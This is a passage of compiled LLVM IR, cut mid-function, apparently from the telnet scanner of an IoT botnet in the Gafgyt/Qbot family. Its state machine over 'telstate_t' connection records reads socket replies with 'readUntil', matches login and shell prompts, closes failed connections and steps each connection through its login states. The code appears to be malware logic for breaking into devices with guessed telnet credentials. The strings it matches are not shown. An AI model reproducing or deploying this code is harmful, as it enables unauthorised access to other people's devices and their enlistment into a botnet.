  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 3
  store i8 1, i8* %1114, align 1
  br label %2047

; <label>:1115:                                   ; preds = %1075
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 0
  %1120 = load i32, i32* %1119, align 16
  %1121 = call i64 @send(i32 %1120, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1122 = icmp slt i64 %1121, 0
  br i1 %1122, label %1123, label %1138

; <label>:1123:                                   ; preds = %1115
  %1124 = load i32, i32* %2, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1125
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1126, i32 0, i32 0
  %1128 = load i32, i32* %1127, align 16
  %1129 = call i32 @sclose(i32 %1128)
  %1130 = load i32, i32* %2, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 2
  store i8 0, i8* %1133, align 8
  %1134 = load i32, i32* %2, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 3
  store i8 1, i8* %1137, align 1
  br label %2047

; <label>:1138:                                   ; preds = %1115
  %1139 = load i32, i32* %2, align 4
  %1140 = sext i32 %1139 to i64
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1140
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1141, i32 0, i32 2
  store i8 6, i8* %1142, align 8
  br label %2046

; <label>:1143:                                   ; preds = %68
  %1144 = load i32, i32* %2, align 4
  %1145 = sext i32 %1144 to i64
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 6
  %1148 = load i32, i32* %1147, align 4
  %1149 = icmp eq i32 %1148, 0
  br i1 %1149, label %1150, label %1156

; <label>:1150:                                   ; preds = %1143
  %1151 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1152 = load i32, i32* %2, align 4
  %1153 = sext i32 %1152 to i64
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1153
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1154, i32 0, i32 6
  store i32 %1151, i32* %1155, align 4
  br label %1156

; <label>:1156:                                   ; preds = %1150, %1143
  %1157 = load i32, i32* %2, align 4
  %1158 = sext i32 %1157 to i64
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1158
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1159, i32 0, i32 0
  %1161 = load i32, i32* %1160, align 16
  %1162 = load i32, i32* %2, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 8
  %1166 = load i8*, i8** %1165, align 8
  %1167 = load i32, i32* %2, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1168
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1169, i32 0, i32 7
  %1171 = load i16, i16* %1170, align 16
  %1172 = zext i16 %1171 to i32
  %1173 = call i32 @readUntil(i32 %1161, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1166, i32 1024, i32 %1172)
  %1174 = icmp ne i32 %1173, 0
  br i1 %1174, label %1175, label %1250

; <label>:1175:                                   ; preds = %1156
  %1176 = load i32, i32* %2, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 6
  store i32 0, i32* %1179, align 4
  %1180 = load i32, i32* %2, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 7
  store i16 0, i16* %1183, align 16
  %1184 = load i32, i32* %2, align 4
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1185
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1186, i32 0, i32 8
  %1188 = load i8*, i8** %1187, align 8
  %1189 = call i8* @strstr(i8* %1188, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1190 = icmp ne i8* %1189, null
  br i1 %1190, label %1191, label %1211

; <label>:1191:                                   ; preds = %1175
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1194, i32 0, i32 8
  %1196 = load i8*, i8** %1195, align 8
  call void @llvm.memset.p0i8.i64(i8* %1196, i8 0, i64 1024, i32 1, i1 false)
  %1197 = load i32, i32* %2, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 0
  %1201 = load i32, i32* %1200, align 16
  %1202 = call i32 @sclose(i32 %1201)
  %1203 = load i32, i32* %2, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 2
  store i8 0, i8* %1206, align 8
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 3
  store i8 0, i8* %1210, align 1
  br label %2047

; <label>:1211:                                   ; preds = %1175
  %1212 = load i32, i32* %2, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 8
  %1216 = load i8*, i8** %1215, align 8
  %1217 = call i32 @matchPrompt(i8* %1216)
  %1218 = icmp ne i32 %1217, 0
  br i1 %1218, label %1239, label %1219

; <label>:1219:                                   ; preds = %1211
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 8
  %1224 = load i8*, i8** %1223, align 8
  call void @llvm.memset.p0i8.i64(i8* %1224, i8 0, i64 1024, i32 1, i1 false)
  %1225 = load i32, i32* %2, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1227, i32 0, i32 0
  %1229 = load i32, i32* %1228, align 16
  %1230 = call i32 @sclose(i32 %1229)
  %1231 = load i32, i32* %2, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 2
  store i8 0, i8* %1234, align 8
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 3
  store i8 1, i8* %1238, align 1
  br label %2047

; <label>:1239:                                   ; preds = %1211
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 2
  store i8 7, i8* %1243, align 8
  br label %1244

; <label>:1244:                                   ; preds = %1239
  %1245 = load i32, i32* %2, align 4
  %1246 = sext i32 %1245 to i64
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 8
  %1249 = load i8*, i8** %1248, align 8
  call void @llvm.memset.p0i8.i64(i8* %1249, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1250:                                   ; preds = %1156
  %1251 = load i32, i32* %2, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 0
  %1255 = load i32, i32* %1254, align 16
  %1256 = load i32, i32* %2, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 8
  %1260 = load i8*, i8** %1259, align 8
  %1261 = load i32, i32* %2, align 4
  %1262 = sext i32 %1261 to i64
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1262
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1263, i32 0, i32 7
  %1265 = load i16, i16* %1264, align 16
  %1266 = zext i16 %1265 to i32
  %1267 = call i32 @readUntil(i32 %1255, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1260, i32 1024, i32 %1266)
  %1268 = icmp ne i32 %1267, 0
  br i1 %1268, label %1269, label %1344

; <label>:1269:                                   ; preds = %1250
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 6
  store i32 0, i32* %1273, align 4
  %1274 = load i32, i32* %2, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 7
  store i16 0, i16* %1277, align 16
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 8
  %1282 = load i8*, i8** %1281, align 8
  %1283 = call i8* @strstr(i8* %1282, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1284 = icmp ne i8* %1283, null
  br i1 %1284, label %1285, label %1305

; <label>:1285:                                   ; preds = %1269
  %1286 = load i32, i32* %2, align 4
  %1287 = sext i32 %1286 to i64
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1287
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1288, i32 0, i32 8
  %1290 = load i8*, i8** %1289, align 8
  call void @llvm.memset.p0i8.i64(i8* %1290, i8 0, i64 1024, i32 1, i1 false)
  %1291 = load i32, i32* %2, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 0
  %1295 = load i32, i32* %1294, align 16
  %1296 = call i32 @sclose(i32 %1295)
  %1297 = load i32, i32* %2, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 2
  store i8 0, i8* %1300, align 8
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 3
  store i8 0, i8* %1304, align 1
  br label %2047

; <label>:1305:                                   ; preds = %1269
  %1306 = load i32, i32* %2, align 4
  %1307 = sext i32 %1306 to i64
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1307
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1308, i32 0, i32 8
  %1310 = load i8*, i8** %1309, align 8
  %1311 = call i32 @matchPrompt(i8* %1310)
  %1312 = icmp ne i32 %1311, 0
  br i1 %1312, label %1333, label %1313

; <label>:1313:                                   ; preds = %1305
  %1314 = load i32, i32* %2, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1316, i32 0, i32 8
  %1318 = load i8*, i8** %1317, align 8
  call void @llvm.memset.p0i8.i64(i8* %1318, i8 0, i64 1024, i32 1, i1 false)
  %1319 = load i32, i32* %2, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1321, i32 0, i32 0
  %1323 = load i32, i32* %1322, align 16
  %1324 = call i32 @sclose(i32 %1323)
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 2
  store i8 0, i8* %1328, align 8
  %1329 = load i32, i32* %2, align 4
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1330
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1331, i32 0, i32 3
  store i8 1, i8* %1332, align 1
  br label %2047

; <label>:1333:                                   ; preds = %1305
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 2
  store i8 7, i8* %1337, align 8
  br label %1338

; <label>:1338:                                   ; preds = %1333
  %1339 = load i32, i32* %2, align 4
  %1340 = sext i32 %1339 to i64
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1340
  %1342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1341, i32 0, i32 8
  %1343 = load i8*, i8** %1342, align 8
  call void @llvm.memset.p0i8.i64(i8* %1343, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1344:                                   ; preds = %1250
  %1345 = load i32, i32* %2, align 4
  %1346 = sext i32 %1345 to i64
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1346
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1347, i32 0, i32 0
  %1349 = load i32, i32* %1348, align 16
  %1350 = load i32, i32* %2, align 4
  %1351 = sext i32 %1350 to i64
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1351
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1352, i32 0, i32 8
  %1354 = load i8*, i8** %1353, align 8
  %1355 = load i32, i32* %2, align 4
  %1356 = sext i32 %1355 to i64
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1356
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1357, i32 0, i32 7
  %1359 = load i16, i16* %1358, align 16
  %1360 = zext i16 %1359 to i32
  %1361 = call i32 @readUntil(i32 %1349, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1354, i32 1024, i32 %1360)
  %1362 = icmp ne i32 %1361, 0
  br i1 %1362, label %1363, label %1438

; <label>:1363:                                   ; preds = %1344
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 6
  store i32 0, i32* %1367, align 4
  %1368 = load i32, i32* %2, align 4
  %1369 = sext i32 %1368 to i64
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1369
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1370, i32 0, i32 7
  store i16 0, i16* %1371, align 16
  %1372 = load i32, i32* %2, align 4
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1373
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1374, i32 0, i32 8
  %1376 = load i8*, i8** %1375, align 8
  %1377 = call i8* @strstr(i8* %1376, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1378 = icmp ne i8* %1377, null
  br i1 %1378, label %1379, label %1399

; <label>:1379:                                   ; preds = %1363
  %1380 = load i32, i32* %2, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 8
  %1384 = load i8*, i8** %1383, align 8
  call void @llvm.memset.p0i8.i64(i8* %1384, i8 0, i64 1024, i32 1, i1 false)
  %1385 = load i32, i32* %2, align 4
  %1386 = sext i32 %1385 to i64
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1386
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1387, i32 0, i32 0
  %1389 = load i32, i32* %1388, align 16
  %1390 = call i32 @sclose(i32 %1389)
  %1391 = load i32, i32* %2, align 4
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1392
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1393, i32 0, i32 2
  store i8 0, i8* %1394, align 8
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 3
  store i8 0, i8* %1398, align 1
  br label %2047

; <label>:1399:                                   ; preds = %1363
  %1400 = load i32, i32* %2, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1401
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1402, i32 0, i32 8
  %1404 = load i8*, i8** %1403, align 8
  %1405 = call i32 @matchPrompt(i8* %1404)
  %1406 = icmp ne i32 %1405, 0
  br i1 %1406, label %1427, label %1407

; <label>:1407:                                   ; preds = %1399
  %1408 = load i32, i32* %2, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1410, i32 0, i32 8
  %1412 = load i8*, i8** %1411, align 8
  call void @llvm.memset.p0i8.i64(i8* %1412, i8 0, i64 1024, i32 1, i1 false)
  %1413 = load i32, i32* %2, align 4
  %1414 = sext i32 %1413 to i64
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1415, i32 0, i32 0
  %1417 = load i32, i32* %1416, align 16
  %1418 = call i32 @sclose(i32 %1417)
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 2
  store i8 0, i8* %1422, align 8
  %1423 = load i32, i32* %2, align 4
  %1424 = sext i32 %1423 to i64
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1424
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1425, i32 0, i32 3
  store i8 1, i8* %1426, align 1
  br label %2047

; <label>:1427:                                   ; preds = %1399
  %1428 = load i32, i32* %2, align 4
  %1429 = sext i32 %1428 to i64
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1429
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1430, i32 0, i32 2
  store i8 7, i8* %1431, align 8
  br label %1432

; <label>:1432:                                   ; preds = %1427
  %1433 = load i32, i32* %2, align 4
  %1434 = sext i32 %1433 to i64
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1434
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1435, i32 0, i32 8
  %1437 = load i8*, i8** %1436, align 8
  call void @llvm.memset.p0i8.i64(i8* %1437, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1438:                                   ; preds = %1344
  %1439 = load i32, i32* %2, align 4
  %1440 = sext i32 %1439 to i64
  %1441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1440
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1441, i32 0, i32 0
  %1443 = load i32, i32* %1442, align 16
  %1444 = load i32, i32* %2, align 4
  %1445 = sext i32 %1444 to i64
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1445
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1446, i32 0, i32 8
  %1448 = load i8*, i8** %1447, align 8
  %1449 = load i32, i32* %2, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 7
  %1453 = load i16, i16* %1452, align 16
  %1454 = zext i16 %1453 to i32
  %1455 = call i32 @readUntil(i32 %1443, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1448, i32 1024, i32 %1454)
  %1456 = icmp ne i32 %1455, 0
  br i1 %1456, label %1457, label %1532

; <label>:1457:                                   ; preds = %1438
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1460, i32 0, i32 6
  store i32 0, i32* %1461, align 4
  %1462 = load i32, i32* %2, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 7
  store i16 0, i16* %1465, align 16
  %1466 = load i32, i32* %2, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 8
  %1470 = load i8*, i8** %1469, align 8
  %1471 = call i8* @strstr(i8* %1470, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1472 = icmp ne i8* %1471, null
  br i1 %1472, label %1473, label %1493

; <label>:1473:                                   ; preds = %1457
  %1474 = load i32, i32* %2, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 8
  %1478 = load i8*, i8** %1477, align 8
  call void @llvm.memset.p0i8.i64(i8* %1478, i8 0, i64 1024, i32 1, i1 false)
  %1479 = load i32, i32* %2, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1480
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1481, i32 0, i32 0
  %1483 = load i32, i32* %1482, align 16
  %1484 = call i32 @sclose(i32 %1483)
  %1485 = load i32, i32* %2, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 2
  store i8 0, i8* %1488, align 8
  %1489 = load i32, i32* %2, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 3
  store i8 0, i8* %1492, align 1
  br label %2047

; <label>:1493:                                   ; preds = %1457
  %1494 = load i32, i32* %2, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 8
  %1498 = load i8*, i8** %1497, align 8
  %1499 = call i32 @matchPrompt(i8* %1498)
  %1500 = icmp ne i32 %1499, 0
  br i1 %1500, label %1521, label %1501

; <label>:1501:                                   ; preds = %1493
  %1502 = load i32, i32* %2, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1503
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1504, i32 0, i32 8
  %1506 = load i8*, i8** %1505, align 8
  call void @llvm.memset.p0i8.i64(i8* %1506, i8 0, i64 1024, i32 1, i1 false)
  %1507 = load i32, i32* %2, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1508
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1509, i32 0, i32 0
  %1511 = load i32, i32* %1510, align 16
  %1512 = call i32 @sclose(i32 %1511)
  %1513 = load i32, i32* %2, align 4
  %1514 = sext i32 %1513 to i64
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1514
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1515, i32 0, i32 2
  store i8 0, i8* %1516, align 8
  %1517 = load i32, i32* %2, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1518
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1519, i32 0, i32 3
  store i8 1, i8* %1520, align 1
  br label %2047

; <label>:1521:                                   ; preds = %1493
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 2
  store i8 7, i8* %1525, align 8
  br label %1526

; <label>:1526:                                   ; preds = %1521
  %1527 = load i32, i32* %2, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1528
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1529, i32 0, i32 8
  %1531 = load i8*, i8** %1530, align 8
  call void @llvm.memset.p0i8.i64(i8* %1531, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1532:                                   ; preds = %1438
  %1533 = load i32, i32* %2, align 4
  %1534 = sext i32 %1533 to i64
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 0
  %1537 = load i32, i32* %1536, align 16
  %1538 = load i32, i32* %2, align 4
  %1539 = sext i32 %1538 to i64
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1539
